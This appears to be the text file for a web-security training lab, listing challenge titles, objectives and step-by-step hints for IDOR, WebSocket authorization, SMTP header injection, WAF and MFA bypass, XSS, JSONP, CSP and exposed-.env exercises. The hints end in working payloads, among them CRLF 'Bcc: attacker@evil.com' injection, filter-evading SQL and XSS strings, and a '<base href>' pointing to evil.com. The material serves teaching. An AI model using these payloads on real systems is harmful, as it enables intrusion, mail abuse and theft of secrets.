Request ?id=abc.

ws-3.title: WebSocket — missing authorization
ws-3.objective: The admin channel handshake never verifies your role. Connect without being an admin.
ws-3.hint: Connect to /lab/ws-3/admin (or ?channel=admin) with a plain session cookie.
hints: The handshake checks for a session but not an admin role.
The admin channel is exposed through the same connection endpoint.
Connect to /lab/ws-3/admin with a normal cookie.

ws-4.title: WebSocket — action without owner check
ws-4.objective: The transfer action trusts the from field you send. Execute an action as another user.
hints: The server trusts the from field supplied by the client.
No ownership or authorization check is applied to the action.
Send from as another user, e.g. {"to":"victim","amount":100,"from":"carlos"}.

idor-1.title: Access another customer's invoice
idor-1.objective: The invoice endpoint trusts the id parameter you supply. Access the admin's invoice.
hints: The endpoint trusts any id you provide.
Your own invoice is 1002 — probe neighbouring ids.
Request /lab/idor-1/invoice?id=1004 to view the admin invoice.

idor-2.title: View another user's profile
idor-2.objective: The profile endpoint trusts the user_id parameter. Fetch the administrator's profile.
hints: The endpoint returns a profile for any user_id.
Your profile is user_id=1.
Request /lab/idor-2/profile?user_id=0 to fetch the admin profile.

smtp-1.title: SMTP header injection (Bcc)
smtp-1.objective: Your email address is copied into the message To: header unsanitized. Inject a CRLF to Bcc yourself.
hints: The email field lands directly in the To: header.
A CRLF (%0d%0a) starts a new header line.
Inject %0d%0aBcc: attacker@evil.com to silently copy the message.

smtp-2.title: SMTP header injection (Subject)
smtp-2.objective: Your name is placed into the email Subject: header raw. Inject a CRLF to forge additional headers.
hints: The name field is placed into the Subject: header.
A CRLF (%0d%0a) terminates the subject and begins a new header.
Inject %0d%0aBcc: victim@example.com to add hidden recipients.

waf-1.title: WAF bypass — SQLi union
waf-1.objective: A naive WAF blocks union select. Bypass the filter with an alternate encoding.
hints: The WAF matches a literal union select pattern.
Comments or tabs break the whitespace match.
Use union/**/select or union select to pass the filter.

waf-2.title: WAF bypass — XSS filter
waf-2.objective: A naive WAF blocks the literal <script tag. Bypass it with an alternate vector.
hints: The WAF only blocks the literal <script.
Many other tags execute script, like <svg onload= or <img onerror=.
Use an alternate vector such as <img src=x onerror=alert(1)>.

mfa-1.title: MFA bypass — skipped step
mfa-1.objective: The server never enforces the 2FA step. Reach the dashboard without entering a valid code.
hints: The 2FA prompt is purely client-side.
The dashboard endpoint has no server-side OTP check.
Request /lab/mfa-1/dashboard to access it directly.

mfa-2.title: MFA bypass — predictable OTP
mfa-2.objective: The one-time code is generated with a predictable algorithm. Login using a guessed OTP.
hints: The OTP algorithm is deterministic.
Guessing the code reveals the predictable generator.
Enter 123456 as the verification code.

xss-8.title: Stored XSS — comments
xss-8.objective: Comments are stored and rendered with no escaping. Post a payload that executes in every viewer's browser.
xss-8.hint: Post a comment containing <script> or an <img onerror= payload.
hints: Comments persist server-side.
They are rendered into the page with no sanitization.
Post a comment containing <script>alert(1)</script> or <img src=x onerror=alert(1)>.

sri-2.title: SRI — JSONP callback hijack
sri-2.objective: The page loads a third-party script via a JSONP endpoint with no integrity hash. Hijack the callback.
hints: The callback value is reflected into the script tag.
No integrity attribute protects the external script.
Use ?callback=alert(1) to turn it into executable JavaScript.

csp-3.title: CSP bypass — missing base-uri
csp-3.objective: The CSP has no base-uri directive. Inject a <base href> to hijack relative resource loads.
hints: A <base> tag rewrites every relative URL on the page.
Without base-uri, CSP cannot block it.
Inject <base href="https://evil.com/"> so relative scripts load from your host.

info-3.title: Sensitive files — exposed .env
info-3.objective: A leftover dotfile is publicly accessible. Read the exposed environment variables.
hints: Deployment artifacts like dotfiles are sometimes left public.
The app serves static paths under its lab directory.
Request /lab/info-3/.env to read the secrets.
